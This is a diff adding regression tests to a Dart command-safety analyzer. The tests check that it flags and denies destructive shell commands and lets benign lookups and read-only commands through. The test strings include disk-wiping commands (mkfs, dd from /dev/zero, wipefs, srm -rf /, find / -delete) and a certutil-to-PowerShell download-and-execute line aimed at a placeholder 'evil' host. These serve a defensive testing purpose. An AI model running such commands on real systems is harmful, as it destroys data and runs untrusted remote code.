@@ -28,6 +28,51 @@ void main() {
         SecurityLevel.critical,
       );
     });
+
+    test('REG-020: "mkfs.ext4 /dev/sda" must be CRITICAL + DENY', () {
+      final analysis = shield.analyze('mkfs.ext4 /dev/sda');
+      expect(analysis.securityLevel, SecurityLevel.critical);
+      expect(
+        shield.validate('mkfs.ext4 /dev/sda').decision,
+        CommandDecision.deny,
+      );
+    });
+
+    test('REG-021: wrapped "sudo mkfs /dev/sdb" remains CRITICAL', () {
+      expect(
+        shield.analyze('sudo mkfs /dev/sdb').securityLevel,
+        SecurityLevel.critical,
+      );
+    });
+
+    test('REG-022: "dd if=/dev/zero of=/dev/sda" must be CRITICAL + DENY', () {
+      const cmd = 'dd if=/dev/zero of=/dev/sda';
+      expect(shield.analyze(cmd).securityLevel, SecurityLevel.critical);
+      expect(shield.validate(cmd).decision, CommandDecision.deny);
+    });
+
+    test('REG-023: "wipefs -a /dev/sdb" must be CRITICAL', () {
+      expect(
+        shield.analyze('wipefs -a /dev/sdb').securityLevel,
+        SecurityLevel.critical,
+      );
+    });
+
+    test('REG-024: "srm -rf /" must be CRITICAL', () {
+      expect(shield.analyze('srm -rf /').securityLevel, SecurityLevel.critical);
+    });
+
+    test('REG-028: "find / -delete" must be CRITICAL + DENY', () {
+      final analysis = shield.analyze('find / -delete');
+      expect(analysis.securityLevel, SecurityLevel.critical);
+      expect(shield.validate('find / -delete').decision, CommandDecision.deny);
+    });
+
+    test('REG-025: "certutil ... | powershell" is download-and-execute', () {
+      const cmd = 'certutil -urlcache -f http://evil/x.ps1 | powershell';
+      expect(shield.analyze(cmd).securityLevel, SecurityLevel.critical);
+      expect(shield.validate(cmd).decision, CommandDecision.deny);
+    });
   });
 
   group('false-positive prevention regressions', () {
@@ -81,6 +126,73 @@ void main() {
             .any((f) => f.code == 'path-traversal'),
         isFalse,
       );
+    });
+
+    test('REG-026: "dd if=in.img of=out.img" file copy is not destructive', () {
+      expect(
+        shield
+            .analyze('dd if=in.img of=out.img')
+            .findings
+            .any((f) => f.code == 'destructive-command'),
+        isFalse,
+      );
+      expect(
+        shield.validate('dd if=in.img of=out.img').decision,
+        CommandDecision.allow,
+      );
+    });
+
+    test('REG-029: "find . -name x.tmp -delete" is not catastrophic', () {
+      // Scoped find -delete is medium (a real deletion) but must NOT be
+      // critical or denied like `find / -delete`.
+      final analysis = shield.analyze('find . -name "*.tmp" -delete');
+      expect(analysis.securityLevel, isNot(SecurityLevel.critical));
+    });
+
+    test('REG-030: "command -v foo" lookups are not destructive', () {
+      // Resolving a name must not be treated as running it.
+      for (final cmd in const [
+        'command -v rm',
+        'command -v mkfs.ext4',
+        'command -V dd',
+      ]) {
+        expect(
+          shield
+              .analyze(cmd)
+              .findings
+              .any((f) => f.code == 'destructive-command'),
+          isFalse,
+          reason: cmd,
+        );
+        expect(
+          shield.validate(cmd).decision,
+          CommandDecision.allow,
+          reason: cmd,
+        );
+      }
+    });
+
+    test('REG-031: real execution through "command" still looks through', () {
+      // `command rm -rf /` (no -v) genuinely runs rm and must stay critical.
+      expect(
+        shield.analyze('command rm -rf /').securityLevel,
+        SecurityLevel.critical,
+      );
+    });
+
+    test('REG-027: routine system/read commands stay ALLOW', () {
+      for (final cmd in const [
+        'systemctl status nginx',
+        'kubectl get pods',
+        'mount',
+        'fdisk -l',
+      ]) {
+        expect(
+          shield.validate(cmd).decision,
+          CommandDecision.allow,
+          reason: cmd,
+        );
+      }
     });
 
     test('REG-016: leading operators must not hang the parser', () {
